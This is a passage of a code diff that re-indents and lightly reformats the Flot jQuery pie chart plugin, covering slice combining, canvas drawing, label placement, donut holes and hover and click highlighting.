-				if (options.series.pie.label.show == "auto") {
-					if (options.legend.show) {
-						options.series.pie.label.show = false;
-					} else {
-						options.series.pie.label.show = true;
-					}
-				}
+                if (options.series.pie.label.show == "auto") {
+                    if (options.legend.show) {
+                        options.series.pie.label.show = false;
+                    } else {
+                        options.series.pie.label.show = true;
+                    }
+                }
 
-				// set radius
+                // set radius
 
-				if (options.series.pie.radius == "auto") {
-					if (options.series.pie.label.show) {
-						options.series.pie.radius = 3/4;
-					} else {
-						options.series.pie.radius = 1;
-					}
-				}
+                if (options.series.pie.radius == "auto") {
+                    if (options.series.pie.label.show) {
+                        options.series.pie.radius = 3 / 4;
+                    } else {
+                        options.series.pie.radius = 1;
+                    }
+                }
 
-				// ensure sane tilt
+                // ensure sane tilt
 
-				if (options.series.pie.tilt > 1) {
-					options.series.pie.tilt = 1;
-				} else if (options.series.pie.tilt < 0) {
-					options.series.pie.tilt = 0;
-				}
-			}
-		});
+                if (options.series.pie.tilt > 1) {
+                    options.series.pie.tilt = 1;
+                } else if (options.series.pie.tilt < 0) {
+                    options.series.pie.tilt = 0;
+                }
+            }
+        });
 
-		plot.hooks.bindEvents.push(function(plot, eventHolder) {
-			var options = plot.getOptions();
-			if (options.series.pie.show) {
-				if (options.grid.hoverable) {
-					eventHolder.unbind("mousemove").mousemove(onMouseMove);
-				}
-				if (options.grid.clickable) {
-					eventHolder.unbind("click").click(onClick);
-				}
-			}
-		});
+        plot.hooks.bindEvents.push(function (plot, eventHolder) {
+            var options = plot.getOptions();
+            if (options.series.pie.show) {
+                if (options.grid.hoverable) {
+                    eventHolder.unbind("mousemove").mousemove(onMouseMove);
+                }
+                if (options.grid.clickable) {
+                    eventHolder.unbind("click").click(onClick);
+                }
+            }
+        });
 
-		plot.hooks.processDatapoints.push(function(plot, series, data, datapoints) {
-			var options = plot.getOptions();
-			if (options.series.pie.show) {
-				processDatapoints(plot, series, data, datapoints);
-			}
-		});
+        plot.hooks.processDatapoints.push(function (plot, series, data, datapoints) {
+            var options = plot.getOptions();
+            if (options.series.pie.show) {
+                processDatapoints(plot, series, data, datapoints);
+            }
+        });
 
-		plot.hooks.drawOverlay.push(function(plot, octx) {
-			var options = plot.getOptions();
-			if (options.series.pie.show) {
-				drawOverlay(plot, octx);
-			}
-		});
+        plot.hooks.drawOverlay.push(function (plot, octx) {
+            var options = plot.getOptions();
+            if (options.series.pie.show) {
+                drawOverlay(plot, octx);
+            }
+        });
 
-		plot.hooks.draw.push(function(plot, newCtx) {
-			var options = plot.getOptions();
-			if (options.series.pie.show) {
-				draw(plot, newCtx);
-			}
-		});
+        plot.hooks.draw.push(function (plot, newCtx) {
+            var options = plot.getOptions();
+            if (options.series.pie.show) {
+                draw(plot, newCtx);
+            }
+        });
 
-		function processDatapoints(plot, series, datapoints) {
-			if (!processed)	{
-				processed = true;
-				canvas = plot.getCanvas();
-				target = $(canvas).parent();
-				options = plot.getOptions();
-				plot.setData(combine(plot.getData()));
-			}
-		}
+        function processDatapoints(plot, series, datapoints) {
+            if (!processed) {
+                processed = true;
+                canvas = plot.getCanvas();
+                target = $(canvas).parent();
+                options = plot.getOptions();
+                plot.setData(combine(plot.getData()));
+            }
+        }
 
-		function combine(data) {
+        function combine(data) {
 
-			var total = 0,
-				combined = 0,
-				numCombined = 0,
-				color = options.series.pie.combine.color,
-				newdata = [];
+            var total = 0,
+                combined = 0,
+                numCombined = 0,
+                color = options.series.pie.combine.color,
+                newdata = [];
 
-			// Fix up the raw data from Flot, ensuring the data is numeric
+            // Fix up the raw data from Flot, ensuring the data is numeric
 
-			for (var i = 0; i < data.length; ++i) {
+            for (var i = 0; i < data.length; ++i) {
 
-				var value = data[i].data;
+                var value = data[i].data;
 
-				// If the data is an array, we'll assume that it's a standard
-				// Flot x-y pair, and are concerned only with the second value.
+                // If the data is an array, we'll assume that it's a standard
+                // Flot x-y pair, and are concerned only with the second value.
 
-				// Note how we use the original array, rather than creating a
-				// new one; this is more efficient and preserves any extra data
-				// that the user may have stored in higher indexes.
+                // Note how we use the original array, rather than creating a
+                // new one; this is more efficient and preserves any extra data
+                // that the user may have stored in higher indexes.
 
-				if ($.isArray(value) && value.length == 1) {
-    				value = value[0];
-				}
+                if ($.isArray(value) && value.length == 1) {
+                    value = value[0];
+                }
 
-				if ($.isArray(value)) {
-					// Equivalent to $.isNumeric() but compatible with jQuery < 1.7
-					if (!isNaN(parseFloat(value[1])) && isFinite(value[1])) {
-						value[1] = +value[1];
-					} else {
-						value[1] = 0;
-					}
-				} else if (!isNaN(parseFloat(value)) && isFinite(value)) {
-					value = [1, +value];
-				} else {
-					value = [1, 0];
-				}
+                if ($.isArray(value)) {
+                    // Equivalent to $.isNumeric() but compatible with jQuery < 1.7
+                    if (!isNaN(parseFloat(value[1])) && isFinite(value[1])) {
+                        value[1] = +value[1];
+                    } else {
+                        value[1] = 0;
+                    }
+                } else if (!isNaN(parseFloat(value)) && isFinite(value)) {
+                    value = [1, +value];
+                } else {
+                    value = [1, 0];
+                }
 
-				data[i].data = [value];
-			}
+                data[i].data = [value];
+            }
 
-			// Sum up all the slices, so we can calculate percentages for each
+            // Sum up all the slices, so we can calculate percentages for each
 
-			for (var i = 0; i < data.length; ++i) {
-				total += data[i].data[0][1];
-			}
+            for (var i = 0; i < data.length; ++i) {
+                total += data[i].data[0][1];
+            }
 
-			// Count the number of slices with percentages below the combine
-			// threshold; if it turns out to be just one, we won't combine.
+            // Count the number of slices with percentages below the combine
+            // threshold; if it turns out to be just one, we won't combine.
 
-			for (var i = 0; i < data.length; ++i) {
-				var value = data[i].data[0][1];
-				if (value / total <= options.series.pie.combine.threshold) {
-					combined += value;
-					numCombined++;
-					if (!color) {
-						color = data[i].color;
-					}
-				}
-			}
+            for (var i = 0; i < data.length; ++i) {
+                var value = data[i].data[0][1];
+                if (value / total <= options.series.pie.combine.threshold) {
+                    combined += value;
+                    numCombined++;
+                    if (!color) {
+                        color = data[i].color;
+                    }
+                }
+            }
 
-			for (var i = 0; i < data.length; ++i) {
-				var value = data[i].data[0][1];
-				if (numCombined < 2 || value / total > options.series.pie.combine.threshold) {
-					newdata.push(
-						$.extend(data[i], {     /* extend to allow keeping all other original data values
+            for (var i = 0; i < data.length; ++i) {
+                var value = data[i].data[0][1];
+                if (numCombined < 2 || value / total > options.series.pie.combine.threshold) {
+                    newdata.push(
+                        $.extend(data[i], {     /* extend to allow keeping all other original data values
 						                           and using them e.g. in labelFormatter. */
-							data: [[1, value]],
-							color: data[i].color,
-							label: data[i].label,
-							angle: value * Math.PI * 2 / total,
-							percent: value / (total / 100)
-						})
-					);
-				}
-			}
-
-			if (numCombined > 1) {
-				newdata.push({
-					data: [[1, combined]],
-					color: color,
-					label: options.series.pie.combine.label,
-					angle: combined * Math.PI * 2 / total,
-					percent: combined / (total / 100)
-				});
-			}
-
-			return newdata;
-		}
-
-		function draw(plot, newCtx) {
-
-			if (!target) {
-				return; // if no series were passed
-			}
-
-			var canvasWidth = plot.getPlaceholder().width(),
-				canvasHeight = plot.getPlaceholder().height(),
-				legendWidth = target.children().filter(".legend").children().width() || 0;
-
-			ctx = newCtx;
-
-			// WARNING: HACK! REWRITE THIS CODE AS SOON AS POSSIBLE!
-
-			// When combining smaller slices into an 'other' slice, we need to
-			// add a new series.  Since Flot gives plugins no way to modify the
-			// list of series, the pie plugin uses a hack where the first call
-			// to processDatapoints results in a call to setData with the new
-			// list of series, then subsequent processDatapoints do nothing.
-
-			// The plugin-global 'processed' flag is used to control this hack;
-			// it starts out false, and is set to true after the first call to
-			// processDatapoints.
-
-			// Unfortunately this turns future setData calls into no-ops; they
-			// call processDatapoints, the flag is true, and nothing happens.
-
-			// To fix this we'll set the flag back to false here in draw, when
-			// all series have been processed, so the next sequence of calls to
-			// processDatapoints once again starts out with a slice-combine.
-			// This is really a hack; in 0.9 we need to give plugins a proper
-			// way to modify series before any processing begins.
-
-			processed = false;
-
-			// calculate maximum radius and center point
-
-			maxRadius =  Math.min(canvasWidth, canvasHeight / options.series.pie.tilt) / 2;
-			centerTop = canvasHeight / 2 + options.series.pie.offset.top;
-			centerLeft = canvasWidth / 2;
-
-			if (options.series.pie.offset.left == "auto") {
-				if (options.legend.position.match("w")) {
-					centerLeft += legendWidth / 2;
-				} else {
-					centerLeft -= legendWidth / 2;
-				}
-				if (centerLeft < maxRadius) {
-					centerLeft = maxRadius;
-				} else if (centerLeft > canvasWidth - maxRadius) {
-					centerLeft = canvasWidth - maxRadius;
-				}
-			} else {
-				centerLeft += options.series.pie.offset.left;
-			}
-
-			var slices = plot.getData(),
-				attempts = 0;
-
-			// Keep shrinking the pie's radius until drawPie returns true,
-			// indicating that all the labels fit, or we try too many times.
-
-			do {
-				if (attempts > 0) {
-					maxRadius *= REDRAW_SHRINK;
-				}
-				attempts += 1;
-				clear();
-				if (options.series.pie.tilt <= 0.8) {
-					drawShadow();
-				}
-			} while (!drawPie() && attempts < REDRAW_ATTEMPTS)
-
-			if (attempts >= REDRAW_ATTEMPTS) {
-				clear();
-				target.prepend("<div class='error'>Could not draw pie with labels contained inside canvas</div>");
-			}
-
-			if (plot.setSeries && plot.insertLegend) {
-				plot.setSeries(slices);
-				plot.insertLegend();
-			}
+                            data: [[1, value]],
+                            color: data[i].color,
+                            label: data[i].label,
+                            angle: value * Math.PI * 2 / total,
+                            percent: value / (total / 100)
+                        })
+                    );
+                }
+            }
+
+            if (numCombined > 1) {
+                newdata.push({
+                    data: [[1, combined]],
+                    color: color,
+                    label: options.series.pie.combine.label,
+                    angle: combined * Math.PI * 2 / total,
+                    percent: combined / (total / 100)
+                });
+            }
+
+            return newdata;
+        }
+
+        function draw(plot, newCtx) {
+
+            if (!target) {
+                return; // if no series were passed
+            }
+
+            var canvasWidth = plot.getPlaceholder().width(),
+                canvasHeight = plot.getPlaceholder().height(),
+                legendWidth = target.children().filter(".legend").children().width() || 0;
+
+            ctx = newCtx;
+
+            // WARNING: HACK! REWRITE THIS CODE AS SOON AS POSSIBLE!
+
+            // When combining smaller slices into an 'other' slice, we need to
+            // add a new series.  Since Flot gives plugins no way to modify the
+            // list of series, the pie plugin uses a hack where the first call
+            // to processDatapoints results in a call to setData with the new
+            // list of series, then subsequent processDatapoints do nothing.
+
+            // The plugin-global 'processed' flag is used to control this hack;
+            // it starts out false, and is set to true after the first call to
+            // processDatapoints.
+
+            // Unfortunately this turns future setData calls into no-ops; they
+            // call processDatapoints, the flag is true, and nothing happens.
+
+            // To fix this we'll set the flag back to false here in draw, when
+            // all series have been processed, so the next sequence of calls to
+            // processDatapoints once again starts out with a slice-combine.
+            // This is really a hack; in 0.9 we need to give plugins a proper
+            // way to modify series before any processing begins.
+
+            processed = false;
+
+            // calculate maximum radius and center point
+
+            maxRadius = Math.min(canvasWidth, canvasHeight / options.series.pie.tilt) / 2;
+            centerTop = canvasHeight / 2 + options.series.pie.offset.top;
+            centerLeft = canvasWidth / 2;
+
+            if (options.series.pie.offset.left == "auto") {
+                if (options.legend.position.match("w")) {
+                    centerLeft += legendWidth / 2;
+                } else {
+                    centerLeft -= legendWidth / 2;
+                }
+                if (centerLeft < maxRadius) {
+                    centerLeft = maxRadius;
+                } else if (centerLeft > canvasWidth - maxRadius) {
+                    centerLeft = canvasWidth - maxRadius;
+                }
+            } else {
+                centerLeft += options.series.pie.offset.left;
+            }
+
+            var slices = plot.getData(),
+                attempts = 0;
+
+            // Keep shrinking the pie's radius until drawPie returns true,
+            // indicating that all the labels fit, or we try too many times.
+
+            do {
+                if (attempts > 0) {
+                    maxRadius *= REDRAW_SHRINK;
+                }
+                attempts += 1;
+                clear();
+                if (options.series.pie.tilt <= 0.8) {
+                    drawShadow();
+                }
+            } while (!drawPie() && attempts < REDRAW_ATTEMPTS)
+
+            if (attempts >= REDRAW_ATTEMPTS) {
+                clear();
+                target.prepend("<div class='error'>Could not draw pie with labels contained inside canvas</div>");
+            }
+
+            if (plot.setSeries && plot.insertLegend) {
+                plot.setSeries(slices);
+                plot.insertLegend();
+            }
 
-			// we're actually done at this point, just defining internal functions at this point
+            // we're actually done at this point, just defining internal functions at this point
 
-			function clear() {
-				ctx.clearRect(0, 0, canvasWidth, canvasHeight);
-				target.children().filter(".pieLabel, .pieLabelBackground").remove();
-			}
+            function clear() {
+                ctx.clearRect(0, 0, canvasWidth, canvasHeight);
+                target.children().filter(".pieLabel, .pieLabelBackground").remove();
+            }
 
-			function drawShadow() {
+            function drawShadow() {
 
-				var shadowLeft = options.series.pie.shadow.left;
-				var shadowTop = options.series.pie.shadow.top;
-				var edge = 10;
-				var alpha = options.series.pie.shadow.alpha;
-				var radius = options.series.pie.radius > 1 ? options.series.pie.radius : maxRadius * options.series.pie.radius;
+                var shadowLeft = options.series.pie.shadow.left;
+                var shadowTop = options.series.pie.shadow.top;
+                var edge = 10;
+                var alpha = options.series.pie.shadow.alpha;
+                var radius = options.series.pie.radius > 1 ? options.series.pie.radius : maxRadius * options.series.pie.radius;
 
-				if (radius >= canvasWidth / 2 - shadowLeft || radius * options.series.pie.tilt >= canvasHeight / 2 - shadowTop || radius <= edge) {
-					return;	// shadow would be outside canvas, so don't draw it
-				}
+                if (radius >= canvasWidth / 2 - shadowLeft || radius * options.series.pie.tilt >= canvasHeight / 2 - shadowTop || radius <= edge) {
+                    return;	// shadow would be outside canvas, so don't draw it
+                }
 
-				ctx.save();
-				ctx.translate(shadowLeft,shadowTop);
-				ctx.globalAlpha = alpha;
-				ctx.fillStyle = "#000";
+                ctx.save();
+                ctx.translate(shadowLeft, shadowTop);
+                ctx.globalAlpha = alpha;
+                ctx.fillStyle = "#000";
 
-				// center and rotate to starting position
+                // center and rotate to starting position
 
-				ctx.translate(centerLeft,centerTop);
-				ctx.scale(1, options.series.pie.tilt);
+                ctx.translate(centerLeft, centerTop);
+                ctx.scale(1, options.series.pie.tilt);
 
-				//radius -= edge;
+                //radius -= edge;
 
-				for (var i = 1; i <= edge; i++) {
-					ctx.beginPath();
-					ctx.arc(0, 0, radius, 0, Math.PI * 2, false);
-					ctx.fill();
-					radius -= i;
-				}
+                for (var i = 1; i <= edge; i++) {
+                    ctx.beginPath();
+                    ctx.arc(0, 0, radius, 0, Math.PI * 2, false);
+                    ctx.fill();
+                    radius -= i;
+                }
 
-				ctx.restore();
-			}
+                ctx.restore();
+            }
 
-			function drawPie() {
+            function drawPie() {
 
-				var startAngle = Math.PI * options.series.pie.startAngle;
-				var radius = options.series.pie.radius > 1 ? options.series.pie.radius : maxRadius * options.series.pie.radius;
+                var startAngle = Math.PI * options.series.pie.startAngle;
+                var radius = options.series.pie.radius > 1 ? options.series.pie.radius : maxRadius * options.series.pie.radius;
 
-				// center and rotate to starting position
+                // center and rotate to starting position
 
-				ctx.save();
-				ctx.translate(centerLeft,centerTop);
-				ctx.scale(1, options.series.pie.tilt);
-				//ctx.rotate(startAngle); // start at top; -- This doesn't work properly in Opera
+                ctx.save();
+                ctx.translate(centerLeft, centerTop);
+                ctx.scale(1, options.series.pie.tilt);
+                //ctx.rotate(startAngle); // start at top; -- This doesn't work properly in Opera
 
-				// draw slices
+                // draw slices
 
-				ctx.save();
-				var currentAngle = startAngle;
-				for (var i = 0; i < slices.length; ++i) {
-					slices[i].startAngle = currentAngle;
-					drawSlice(slices[i].angle, slices[i].color, true);
-				}
-				ctx.restore();
+                ctx.save();
+                var currentAngle = startAngle;
+                for (var i = 0; i < slices.length; ++i) {
+                    slices[i].startAngle = currentAngle;
+                    drawSlice(slices[i].angle, slices[i].color, true);
+                }
+                ctx.restore();
 
-				// draw slice outlines
+                // draw slice outlines
 
-				if (options.series.pie.stroke.width > 0) {
-					ctx.save();
-					ctx.lineWidth = options.series.pie.stroke.width;
-					currentAngle = startAngle;
-					for (var i = 0; i < slices.length; ++i) {
-						drawSlice(slices[i].angle, options.series.pie.stroke.color, false);
-					}
-					ctx.restore();
-				}
+                if (options.series.pie.stroke.width > 0) {
+                    ctx.save();
+                    ctx.lineWidth = options.series.pie.stroke.width;
+                    currentAngle = startAngle;
+                    for (var i = 0; i < slices.length; ++i) {
+                        drawSlice(slices[i].angle, options.series.pie.stroke.color, false);
+                    }
+                    ctx.restore();
+                }
 
-				// draw donut hole
+                // draw donut hole
 
-				drawDonutHole(ctx);
+                drawDonutHole(ctx);
 
-				ctx.restore();
+                ctx.restore();
 
-				// Draw the labels, returning true if they fit within the plot
+                // Draw the labels, returning true if they fit within the plot
 
-				if (options.series.pie.label.show) {
-					return drawLabels();
-				} else return true;
+                if (options.series.pie.label.show) {
+                    return drawLabels();
+                } else return true;
 
-				function drawSlice(angle, color, fill) {
+                function drawSlice(angle, color, fill) {
 
-					if (angle <= 0 || isNaN(angle)) {
-						return;
-					}
+                    if (angle <= 0 || isNaN(angle)) {
+                        return;
+                    }
 
-					if (fill) {
-						ctx.fillStyle = color;
-					} else {
-						ctx.strokeStyle = color;
-						ctx.lineJoin = "round";
-					}
+                    if (fill) {
+                        ctx.fillStyle = color;
+                    } else {
+                        ctx.strokeStyle = color;
+                        ctx.lineJoin = "round";
+                    }
 
-					ctx.beginPath();
-					if (Math.abs(angle - Math.PI * 2) > 0.000000001) {
-						ctx.moveTo(0, 0); // Center of the pie
-					}
+                    ctx.beginPath();
+                    if (Math.abs(angle - Math.PI * 2) > 0.000000001) {
+                        ctx.moveTo(0, 0); // Center of the pie
+                    }
 
-					//ctx.arc(0, 0, radius, 0, angle, false); // This doesn't work properly in Opera
-					ctx.arc(0, 0, radius,currentAngle, currentAngle + angle / 2, false);
-					ctx.arc(0, 0, radius,currentAngle + angle / 2, currentAngle + angle, false);
-					ctx.closePath();
-					//ctx.rotate(angle); // This doesn't work properly in Opera
-					currentAngle += angle;
+                    //ctx.arc(0, 0, radius, 0, angle, false); // This doesn't work properly in Opera
+                    ctx.arc(0, 0, radius, currentAngle, currentAngle + angle / 2, false);
+                    ctx.arc(0, 0, radius, currentAngle + angle / 2, currentAngle + angle, false);
+                    ctx.closePath();
+                    //ctx.rotate(angle); // This doesn't work properly in Opera
+                    currentAngle += angle;
 
-					if (fill) {
-						ctx.fill();
-					} else {
-						ctx.stroke();
-					}
-				}
+                    if (fill) {
+                        ctx.fill();
+                    } else {
+                        ctx.stroke();
+                    }
+                }
 
-				function drawLabels() {
+                function drawLabels() {
 
-					var currentAngle = startAngle;
-					var radius = options.series.pie.label.radius > 1 ? options.series.pie.label.radius : maxRadius * options.series.pie.label.radius;
+                    var currentAngle = startAngle;
+                    var radius = options.series.pie.label.radius > 1 ? options.series.pie.label.radius : maxRadius * options.series.pie.label.radius;
 
-					for (var i = 0; i < slices.length; ++i) {
-						if (slices[i].percent >= options.series.pie.label.threshold * 100) {
-							if (!drawLabel(slices[i], currentAngle, i)) {
-								return false;
-							}
-						}
-						currentAngle += slices[i].angle;
-					}
+                    for (var i = 0; i < slices.length; ++i) {
+                        if (slices[i].percent >= options.series.pie.label.threshold * 100) {
+                            if (!drawLabel(slices[i], currentAngle, i)) {
+                                return false;
+                            }
+                        }
+                        currentAngle += slices[i].angle;
+                    }
 
-					return true;
+                    return true;
 
-					function drawLabel(slice, startAngle, index) {
+                    function drawLabel(slice, startAngle, index) {
 
-						if (slice.data[0][1] == 0) {
-							return true;
-						}
+                        if (slice.data[0][1] == 0) {
+                            return true;
+                        }
 
-						// format label text
+                        // format label text
 
-						var lf = options.legend.labelFormatter, text, plf = options.series.pie.label.formatter;
+                        var lf = options.legend.labelFormatter, text, plf = options.series.pie.label.formatter;
 
-						if (lf) {
-							text = lf(slice.label, slice);
-						} else {
-							text = slice.label;
-						}
+                        if (lf) {
+                            text = lf(slice.label, slice);
+                        } else {
+                            text = slice.label;
+                        }
 
-						if (plf) {
-							text = plf(text, slice);
-						}
+                        if (plf) {
+                            text = plf(text, slice);
+                        }
 
-						var halfAngle = ((startAngle + slice.angle) + startAngle) / 2;
-						var x = centerLeft + Math.round(Math.cos(halfAngle) * radius);
-						var y = centerTop + Math.round(Math.sin(halfAngle) * radius) * options.series.pie.tilt;
+                        var halfAngle = ((startAngle + slice.angle) + startAngle) / 2;
+                        var x = centerLeft + Math.round(Math.cos(halfAngle) * radius);
+                        var y = centerTop + Math.round(Math.sin(halfAngle) * radius) * options.series.pie.tilt;
 
-						var html = "<span class='pieLabel' id='pieLabel" + index + "' style='position:absolute;top:" + y + "px;left:" + x + "px;'>" + text + "</span>";
-						target.append(html);
+                        var html = "<span class='pieLabel' id='pieLabel" + index + "' style='position:absolute;top:" + y + "px;left:" + x + "px;'>" + text + "</span>";
+                        target.append(html);
 
-						var label = target.children("#pieLabel" + index);
-						var labelTop = (y - label.height() / 2);
-						var labelLeft = (x - label.width() / 2);
+                        var label = target.children("#pieLabel" + index);
+                        var labelTop = (y - label.height() / 2);
+                        var labelLeft = (x - label.width() / 2);
 
-						label.css("top", labelTop);
-						label.css("left", labelLeft);
+                        label.css("top", labelTop);
+                        label.css("left", labelLeft);
 
-						// check to make sure that the label is not outside the canvas
+                        // check to make sure that the label is not outside the canvas
 
-						if (0 - labelTop > 0 || 0 - labelLeft > 0 || canvasHeight - (labelTop + label.height()) < 0 || canvasWidth - (labelLeft + label.width()) < 0) {
-							return false;
-						}
+                        if (0 - labelTop > 0 || 0 - labelLeft > 0 || canvasHeight - (labelTop + label.height()) < 0 || canvasWidth - (labelLeft + label.width()) < 0) {
+                            return false;
+                        }
 
-						if (options.series.pie.label.background.opacity != 0) {
+                        if (options.series.pie.label.background.opacity != 0) {
 
-							// put in the transparent background separately to avoid blended labels and label boxes
+                            // put in the transparent background separately to avoid blended labels and label boxes
 
-							var c = options.series.pie.label.background.color;
-
-							if (c == null) {
-								c = slice.color;
-							}
-
-							var pos = "top:" + labelTop + "px;left:" + labelLeft + "px;";
-							$("<div class='pieLabelBackground' style='position:absolute;width:" + label.width() + "px;height:" + label.height() + "px;" + pos + "background-color:" + c + ";'></div>")
-								.css("opacity", options.series.pie.label.background.opacity)
-								.insertBefore(label);
-						}
-
-						return true;
-					} // end individual label function
-				} // end drawLabels function
-			} // end drawPie function
-		} // end draw function
-
-		// Placed here because it needs to be accessed from multiple locations
-
-		function drawDonutHole(layer) {
-			if (options.series.pie.innerRadius > 0) {
-
-				// subtract the center
-
-				layer.save();
-				var innerRadius = options.series.pie.innerRadius > 1 ? options.series.pie.innerRadius : maxRadius * options.series.pie.innerRadius;
-				layer.globalCompositeOperation = "destination-out"; // this does not work with excanvas, but it will fall back to using the stroke color
-				layer.beginPath();
-				layer.fillStyle = options.series.pie.stroke.color;
-				layer.arc(0, 0, innerRadius, 0, Math.PI * 2, false);
-				layer.fill();
-				layer.closePath();
-				layer.restore();
-
-				// add inner stroke
-
-				layer.save();
-				layer.beginPath();
-				layer.strokeStyle = options.series.pie.stroke.color;
-				layer.arc(0, 0, innerRadius, 0, Math.PI * 2, false);
-				layer.stroke();
-				layer.closePath();
-				layer.restore();
-
-				// TODO: add extra shadow inside hole (with a mask) if the pie is tilted.
-			}
-		}
-
-		//-- Additional Interactive related functions --
-
-		function isPointInPoly(poly, pt) {
-			for(var c = false, i = -1, l = poly.length, j = l - 1; ++i < l; j = i)
-				((poly[i][1] <= pt[1] && pt[1] < poly[j][1]) || (poly[j][1] <= pt[1] && pt[1]< poly[i][1]))
-				&& (pt[0] < (poly[j][0] - poly[i][0]) * (pt[1] - poly[i][1]) / (poly[j][1] - poly[i][1]) + poly[i][0])
-				&& (c = !c);
-			return c;
-		}
-
-		function findNearbySlice(mouseX, mouseY) {
-
-			var slices = plot.getData(),
-				options = plot.getOptions(),
-				radius = options.series.pie.radius > 1 ? options.series.pie.radius : maxRadius * options.series.pie.radius,
-				x, y;
-
-			for (var i = 0; i < slices.length; ++i) {
-
-				var s = slices[i];
-
-				if (s.pie.show) {
-
-					ctx.save();
-					ctx.beginPath();
-					ctx.moveTo(0, 0); // Center of the pie
-					//ctx.scale(1, options.series.pie.tilt);	// this actually seems to break everything when here.
-					ctx.arc(0, 0, radius, s.startAngle, s.startAngle + s.angle / 2, false);
-					ctx.arc(0, 0, radius, s.startAngle + s.angle / 2, s.startAngle + s.angle, false);
-					ctx.closePath();
-					x = mouseX - centerLeft;
-					y = mouseY - centerTop;
-
-					if (ctx.isPointInPath) {
-						if (ctx.isPointInPath(mouseX - centerLeft, mouseY - centerTop)) {
-							ctx.restore();
-							return {
-								datapoint: [s.percent, s.data],
-								dataIndex: 0,
-								series: s,
-								seriesIndex: i
-							};
-						}
-					} else {
-
-						// excanvas for IE doesn;t support isPointInPath, this is a workaround.
-
-						var p1X = radius * Math.cos(s.startAngle),
-							p1Y = radius * Math.sin(s.startAngle),
-							p2X = radius * Math.cos(s.startAngle + s.angle / 4),
-							p2Y = radius * Math.sin(s.startAngle + s.angle / 4),
-							p3X = radius * Math.cos(s.startAngle + s.angle / 2),
-							p3Y = radius * Math.sin(s.startAngle + s.angle / 2),
-							p4X = radius * Math.cos(s.startAngle + s.angle / 1.5),
-							p4Y = radius * Math.sin(s.startAngle + s.angle / 1.5),
-							p5X = radius * Math.cos(s.startAngle + s.angle),
-							p5Y = radius * Math.sin(s.startAngle + s.angle),
-							arrPoly = [[0, 0], [p1X, p1Y], [p2X, p2Y], [p3X, p3Y], [p4X, p4Y], [p5X, p5Y]],
-							arrPoint = [x, y];
-
-						// TODO: perhaps do some mathmatical trickery here with the Y-coordinate to compensate for pie tilt?
-
-						if (isPointInPoly(arrPoly, arrPoint)) {
-							ctx.restore();
-							return {
-								datapoint: [s.percent, s.data],
-								dataIndex: 0,
-								series: s,
-								seriesIndex: i
-							};
-						}
-					}
-
-					ctx.restore();
-				}
-			}
-
-			return null;
-		}
-
-		function onMouseMove(e) {
-			triggerClickHoverEvent("plothover", e);
-		}
-
-		function onClick(e) {
-			triggerClickHoverEvent("plotclick", e);
-		}
-
-		// trigger click or hover event (they send the same parameters so we share their code)
-
-		function triggerClickHoverEvent(eventname, e) {
-
-			var offset = plot.offset();
-			var canvasX = parseInt(e.pageX - offset.left);
-			var canvasY =  parseInt(e.pageY - offset.top);
-			var item = findNearbySlice(canvasX, canvasY);
-
-			if (options.grid.autoHighlight) {
-
-				// clear auto-highlights
-
-				for (var i = 0; i < highlights.length; ++i) {
-					var h = highlights[i];
-					if (h.auto == eventname && !(item && h.series == item.series)) {
-						unhighlight(h.series);
-					}
-				}
-			}
-
-			// highlight the slice
-
-			if (item) {
-				highlight(item.series, eventname);
-			}
-
-			// trigger any hover bind events
-
-			var pos = { pageX: e.pageX, pageY: e.pageY };
-			target.trigger(eventname, [pos, item]);
-		}
-
-		function highlight(s, auto) {
-			//if (typeof s == "number") {
-			//	s = series[s];
-			//}
-
-			var i = indexOfHighlight(s);
-
-			if (i == -1) {
-				highlights.push({ series: s, auto: auto });
-				plot.triggerRedrawOverlay();
-			} else if (!auto) {
-				highlights[i].auto = false;
-			}
-		}
-
-		function unhighlight(s) {
-			if (s == null) {
-				highlights = [];
-				plot.triggerRedrawOverlay();
-			}
-
-			//if (typeof s == "number") {
-			//	s = series[s];
-			//}
-
-			var i = indexOfHighlight(s);
-
-			if (i != -1) {
-				highlights.splice(i, 1);
-				plot.triggerRedrawOverlay();
-			}
-		}
-
-		function indexOfHighlight(s) {
-			for (var i = 0; i < highlights.length; ++i) {
-				var h = highlights[i];
-				if (h.series == s)
-					return i;
-			}
-			return -1;
-		}
-
-		function drawOverlay(plot, octx) {
-
-			var options = plot.getOptions();
-
-			var radius = options.series.pie.radius > 1 ? options.series.pie.radius : maxRadius * options.series.pie.radius;
-
-			octx.save();
-			octx.translate(centerLeft, centerTop);
-			octx.scale(1, options.series.pie.tilt);
-
-			for (var i = 0; i < highlights.length; ++i) {
-				drawHighlight(highlights[i].series);
-			}
-
-			drawDonutHole(octx);
-
-			octx.restore();
-
-			function drawHighlight(series) {
-
-				if (series.angle <= 0 || isNaN(series.angle)) {
-					return;
-				}
-
-				//octx.fillStyle = parseColor(options.series.pie.highlight.color).scale(null, null, null, options.series.pie.highlight.opacity).toString();
-				octx.fillStyle = "rgba(255, 255, 255, " + options.series.pie.highlight.opacity + ")"; // this is temporary until we have access to parseColor
-				octx.beginPath();
-				if (Math.abs(series.angle - Math.PI * 2) > 0.000000001) {
-					octx.moveTo(0, 0); // Center of the pie
-				}
-				octx.arc(0, 0, radius, series.startAngle, series.startAngle + series.angle / 2, false);
-				octx.arc(0, 0, radius, series.startAngle + series.angle / 2, series.startAngle + series.angle, false);
-				octx.closePath();
-				octx.fill();
-			}
-		}
-	} // end init (plugin body)
-
-	// define pie specific options and their default values
-
-	var options = {
-		series: {
-			pie: {
-				show: false,
-				radius: "auto",	// actual radius of the visible pie (based on full calculated radius if <=1, or hard pixel value)
-				innerRadius: 0, /* for donut */
-				startAngle: 3/2,
-				tilt: 1,
-				shadow: {
-					left: 5,	// shadow left offset
-					top: 15,	// shadow top offset
-					alpha: 0.02	// shadow alpha
-				},
-				offset: {
-					top: 0,
-					left: "auto"
-				},
-				stroke: {
-					color: "#fff",
-					width: 1
-				},
-				label: {
-					show: "auto",
-					formatter: function(label, slice) {
-						return "<div style='font-size:x-small;text-align:center;padding:2px;color:" + slice.color + ";'>" + label + "<br/>" + Math.round(slice.percent) + "%</div>";
-					},	// formatter function
-					radius: 1,	// radius at which to place the labels (based on full calculated radius if <=1, or hard pixel value)
-					background: {
-						color: null,
-						opacity: 0
-					},
-					threshold: 0	// percentage at which to hide the label (i.e. the slice is too narrow)
-				},
-				combine: {
-					threshold: -1,	// percentage at which to combine little slices into one larger slice
-					color: null,	// color to give the new slice (auto-generated if null)
-					label: "Other"	// label to give the new slice
-				},
-				highlight: {
-					//color: "#fff",		// will add this functionality once parseColor is available
-					opacity: 0.5
-				}
-			}
-		}
-	};
-
-	$.plot.plugins.push({
-		init: init,
